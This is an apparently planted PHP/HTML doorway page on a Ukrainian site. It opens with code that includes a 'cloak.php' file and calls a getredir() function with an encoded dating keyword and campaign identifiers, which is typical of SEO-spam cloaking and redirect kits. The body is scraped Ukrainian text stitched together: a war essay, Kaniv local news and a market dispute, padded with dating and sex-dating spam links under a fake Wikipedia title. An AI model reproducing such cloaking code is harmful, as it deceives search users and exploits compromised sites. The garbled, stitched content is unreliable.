<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%9a%d0%b0%d0%bd%d1%96%d0%b2+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Канів — Вікіпедія</title>
	<meta name="description" content="Ка́нів — місто обласного значення в Україні, Черкаської області. Канів згадується також у році, коли князь Всеволод Ольгович заснував тут" />
	<link rel="canonical" href="https://masage.od.ua/img/184/gucu-shvidksn-znayomstva.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/468/powe-znayomstva-z-dvchinoyu.php">знайомства з дівчиною поблизу Одеса Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/280/rov-noviy-sayt.php">новий сайт знайомств поблизу Молодогвардійськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/dazu-dodatok-dlya-lesbyanok.php">додаток для лесбіянок у Глухів Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/113/hagu-starsh-znayomstva.php">старші знайомства Вознесенівка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/468/qoka-znayomstva-dlya-doroslih.php">знайомства для дорослих Нікополь Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Швидкісні знайомства Канів Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Замість очікуваної захисної цінності скрізь знаходимо нестачу, яму, пастку. Ми самі немов би провалюємось у прірву між хибною дією та злочинною бездіяльністю.</p>
		
	<p>Рік війни минув, але надзвичайний стан речей нікуди не подівся. Час загальмувався та почав день у день відтворювати свою ж власну важку буденність. Ми майже втратили лють, вогонь та завзяття а натомість отримали неминуче зростаючу втому. Тривога перетворилася на звичку, нечутливість не захищає. Звичка до біди не захищає також, а навпаки цю біду накопичує, складає, консервує. Ми потрапили до пастки часу, що не обмінюється, застоявся та псується. Тривога виснажила настільки, що закортіло хоча би на деякий час заховатися не тільки від війни, а й від миру, який не втомлюється живити нашу війну.</p><strong><a id='k1'></a><h2>ЧЕРВОНЕЧОРНЕ — Княжа Гора - Місце Сили</h2></strong><p>Але звідки саме насувається небезпека? Мир став ворожим, бо постійна загроза великої війни занадто довго випробовує його. Наш примарний спокій було взято у позику, яку доведеться чимось віддавати. Такі вказівники бомбосховищ на випадок авіаційної атаки ніби промовляли до нас: маєте ще запаси спокою на чорний день.</p>
		
			
				<div>Зеленський в Каневі</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/-BQ3JPJfbbg' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Досить символічно, що часто ці написи спрямовували у нікуди, бо за вказаним напрямком не було ніякого укриття. На тлі драматичних та трагічних подій в Україні виникає наскільки важливе, настільки навіть болісне питання — де ж міститься художнє висловлювання — нібито йому немає місця в сучасній реальності, яка щодня перевершує сама себе в проявах жорстокості.</p>
<p>Але ж якби мова, перекресливши власні межі, зрівнялась із реальністю в абсурдності та непередбачуваності та навіть жорстокості, то, безперечно, була б віршована мова. Більш того, саме плинний поетичний образ втілює дійсність, наприклад краєвид або людину, — і аж ніяк не навпаки.</p><strong><a id='k2'></a><h2>Арт-Резиденція і Канівський Міжнародний Скульптурний Симпозіум «ЧервонеЧорне»</h2></strong><p>Спроба замкнути Шевченка в музеях та книжках, задушити його гучними вшануваннями, знешкодити живі тексти шляхом роздирання на мертві цитати, геть порожні від давно загублених змістів, вкотре зазнала поразки. Шевченко знову звільнився й сам вийшов на власне ювілейне святкування, «сміючись сльозами». Саме там проходили літню практику студенти Київського державного художнього інституту, започатковану ще у і тодішнім його ректором Федором Кричевським. Авторський текст, виповнений хвилюючими спогадами, допомагає зрозуміти не лише творчий доробок вересня минулого року, а й головний напрямок його пошуків насьогодні.</p>
<p>developed at INTSIGN. ГОЛОВНА НОВИНИ ГОТЕЛЬ РЕСТОРАЦІЯ ЧЕРВОНЕЧОРНЕ ПРИГОДИ ПРОСТО НЕБА МІСЦЯ СИЛИ. Арт-Резиденція і Канівський Міжнародний Скульптурний Симпозіум «ЧервонеЧорне». Лінія Розмежування Володимир Будніков, Влада Ралко. Володимир Будніков, Влада Ралко, Канів,  УКРИТТЯ Володимир Будніков, Влада Ралко. ПРИХИСТОК ПОЕТА Володимир Будніков, Влада Ралко. КАНІВ, ВУЛ. Черкаське обласне відділення фонду соціального захисту інвалідів на створення цієї кімнати виділило 31 тис. Теги статті: сенсорна кімната    Астра    ДЦП    WayBe 3 жовтня , Коментарів: 1   Голосів: 0   0 Школа оновлюється Міські новини У Ліплявській загальноосвітній школі Канівського району продовжують капітальний ремонт спортзали.</p>
<p>Як зауважила директор школи Галина Кубар, навчальний заклад невдовзі буде з природним газом. Разом із цими оновленнями вперше відкрився буфет, площа якого займає 10 кв м. Довідник містить короткі розповіді про ключових персон Канева: владців, бізнесменів, політичних та громадських діячів. На ній були представлені поштові марки та конверти із приватної колекції Анатолія Верхогляда. Канівчанин протягом 40 років займався колекціюванням. За цей час він зібрав марки, які співзвучні назвам вулиць міста, а їх у Каневі і 18 провулків. Теги статті: виставка марок    Верхогляд    WayBe 3 жовтня , Коментарів: 1   Голосів: 0   0 На Канівщині річний чоловік забив до смерті свою дружину Міські новини Протягом тижня працівники органів внутрішніх справ області зареєстрували та розкрили по гарячих слідах одне тяжке тілесне ушкодження, яке спричинило смерть потерпілого.</p>
<p>Так, 25 вересня в с. Степанці Канівського району в приватному будинку було виявлено труп річної місцевої жительки з гематомами на обличчі та саднами на тілі. Проведеними оперативно-розшуковими заходами встановлено, що тілесні ушкодження, перебуваючи в стані алкогольного сп'яніння, наніс руками її річний чоловік. Теги статті: кримінал    вбивство    WayBe 2 жовтня , Коментарів: 1   Голосів: 0   0 Торговий скандал у Каневі Міські новини Торгівля в міському будинку культури дешевим товаром роз¬почалася у середу, 20 вересня.</p>
<p>Хоча цей захід надто й не рекла¬мувався - канівці знали про це вже за кілька днів до початку розпродажу. В перший же день у фойє будинку культури немо¬жливо було пропхатися: хто з цікавості, хто з конкретною метою щось придбати - народу зібра¬лося багато.</p><a id='k3'></a><h3>Навігаційне меню</h3><p>Та й не дивно: чере¬вики, чоботи, кросівки, костюми - удвічі дешевші, ніж на базарі, а тим більше - в магазині. Люди купували по кілька пар взуття - для всієї сім'ї Такий торговий ажіотаж тривав три дні, хоча розпродаж анонсу¬вався на найближчі п'ять днів. У суботу, 23 вересня, до часу відкриття тимчасового торгове¬льного закладу зібралось чима¬ло людей.</p>
<p>Переважна більшість з них - люди похилого віку, ба¬гатодітні батьки О десятій ранку - двері зачи¬нені, о пів на одинадцяту - та¬кож. До входу в будинок культу¬ри підігнали порожній вантажний фургон. Серед людей, що зібра¬лися біля будинку культури, піш¬ла мова про те, що місцева вла¬да заборонила торгівлю і нака¬зала заїжджим торговцям "заби¬рати манатки" У редакції ВІКИ зранку в су¬боту телефон був "червоний" від дзвінків обурених канівців. Люди просили розібратися з тим, що діється Ми поспілкувалися з багатьма людьми, які зібралися біля буди¬нку культури і в центрі міста.</p>
<p>Анна Федорівна, пенсіонер¬ка: "Купила чотири пари кімнат¬них тапочок по 5 гривень, дві пари туфель по 10 гривень. В мага¬зині і на базарі я не куплю так дешево за свою пенсію. Пенсіо¬неру це вигідно Та прий¬шов мер і заборонив. Самі понабирали мішками собі. Тут же черевики по 40 гривень, а на база¬рі - по сто двадцять. Найдешевші туфлі на базарі коштують 30 гривень, а тут - десятка. Ми, пенсіонери, такі малі пенсії отри¬муємо та хотіли скупитися тут дешево - а вони закрили На питання, що купила Галина Іва¬нівна на розпродажу, відповіла: "Та ще нічого, я тільки вчора пен¬сію отримала.</p>
<p>Прийшла сьогод¬ні, а тут зачинено Дід з дому ви¬жене, що гроші провозила і повернуся з порожніми руками Хоті¬ла одягти і взути. На базарі я не можу купити їм взуття і одяг. Хоті¬ла дешевше купити - "купила" вже Люди "давали перцю" і меру Коломійцю, і його заступнику Москальцю. Часом висловлювання були такі, що в газеті таке не надру¬куєш Ми звернулися за коментарем до Миколи Москальця, першо¬го заступника Канівського місь¬кого голови.</p>
<p>Ось що він розповів про те, що стало¬ся:- Я не був при¬четний до надан¬ня дозволу на ві¬дкриття торгової точки в міському будинку культури. Хоча моя особис¬та думка до того, що в міському ку¬льтурному закладі - будинку культу¬ри-такий бедлам був, дуже негати¬вна. Ці торговці ук¬лали угоду з відділом культури на п'ять днів. Три дні вони поп¬рацювали. А в п'ятницю мені до¬велося витримати двогодинний діалог, якщо це можна було так назвати, з канівськими суб'єкта¬ми підприємницької діяльності - з торговцями на ринку.</p>
<p>Я не можу сказати - було їх 50 чи , було їх стільки, скільки вмі¬стив кабінет міського голови, та ще й приймальня. Голови не бу¬ло в цей час, він був на очисних спорудах. Тому мені довелося приймати людей.</p>
		
			<br><ol>
			
				<li>західний гачок Світлодарськ Україна.</li>
			
				<li>сайт знайомств для одиноких людей в Селидове Україна;</li>
			
				<li>безкоштовні секс знайомства поблизу Ровеньки Україна;</li>
			
				<li>для знайомств в Ямпіль Україна;</li>
			
			</ol>
		
	<p>Ситуація була настільки непередбачувана, що невідомо, куди могла б поверну¬ти, і треба було оцінювати цю ситуацію і приймати рішення. Ситуація була дуже загострена Тобто люди прийшли з великою протестною акцією до влади. Говорили про те, що їм, канівцям, влада не дає на площі Комсомолу торгувати. Вони тут же понаписували заяви на дозвіл торгувати в кінотеатрі.</p><img src="https://picua.org/images/2021/02/09/1c0953724d53b08bb0d44a915dd1d494.jpg" alt="НАДІСЛАТИ НАМ ЛИСТА" style="max-width: 480px; max-height: 480px;"/><p>Ми, мовляв, торгуємо на базарі до дванадцятої годи¬ни, після цього часу з базару всі розбігають¬ся, а якби ми сиділи в центрі, то до нас би та¬кож люди йшли. Звичайно, тут палиця на два кін¬ці: тут мова йде й про тих, хто купує, і про тих, хто продає. Кого тут захищати? Уданому випадку міському голові а на його місці опинився я довелося приймати рішення.</p>
<p>Щоб не трапилось яки¬хось непрогнозованих ситуацій, а погрози були різні: ми й ляже¬мо тут, і перекриємо дорогу, хто буде годувати наших дітей і т.</p><strong><a id='k4'></a><h2>Канівський район</h2></strong><p>Важко передати, який жаргон звучав тут у кабінеті. Власне діа¬логу як такого й не було - вони просто випускали пару. Врешті-решт, порадившись з головою я зв'язався з ним мобільним теле¬фоном , я вирішив попросити вибачення у приїжджих торговців і попросив їх, щоб вони збирали¬ся аби не сталося якихось непередбачуваних речей Адже зву¬чало навіть посилання на угорсь¬кі події з пожежами і розбитими вікнами У декого викликає сумнів, наприклад, якість тієї ж зубної пасти, яка начебто коштує 23 гривні, а продавали в будинку культури по  Мовляв, торговці продають пасту, від якої й зуби можуть випасти, і сертифіката якості начебто не було І покупець був би задо¬волений У майбутньому в кіно¬театрі я б не хотів цього бачити, а загалом проведення ярмарок на зразок Сорочинського я б під¬тримав.</p>
<p>Хай би приїздили великі оптові організації і вели розпро¬даж товару. І наші торговці мог¬ли б скупитися на таких ринках, аби не їхати за товаром у Хмель¬ницький Це все довелося ви¬рішувати спонтанно, на той мо¬мент іншого шляху вирішення цієї проблеми просто не було.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/398/ku-pobachennya-znovu-gulyaypole.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/398/zymu-azatsk-svatannya-v.php">азіатські сватання в Дніпро Україна</a></li><li><a href="https://masage.od.ua/img/422/mihif-pdklyuchiti-sayt.php">підключити сайт в Покров Україна</a></li><li><a href="https://masage.od.ua/img/361/qiwy-zvyazki-znayomstva-slavuta.php">зв’язки знайомства Славута Україна</a></li><li><a href="https://masage.od.ua/img/237/hecit-sayti-seksualnih-znayomstv.php">сайти сексуальних знайомств Бобринець Україна</a></li><li><a href="https://masage.od.ua/img/313/mojuw-pdklyuchennya-v.php">підключення в Чернівці Україна</a></li><li><a href="https://masage.od.ua/img/422/lovyw-dzherela-znayomstv-poblizu.php">джерела знайомств поблизу Харцизьк Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#k1'>ЧЕРВОНЕЧОРНЕ — Княжа Гора - Місце Сили</a></li>
<li><a href='#k2'>Арт-Резиденція і Канівський Міжнародний Скульптурний Симпозіум «ЧервонеЧорне»</a></li>
<li><a href='#k3'>Навігаційне меню</a></li>
<li><a href='#k4'>Канівський район</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/406/sozo-vikonavch-znayomstva-poblizu.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>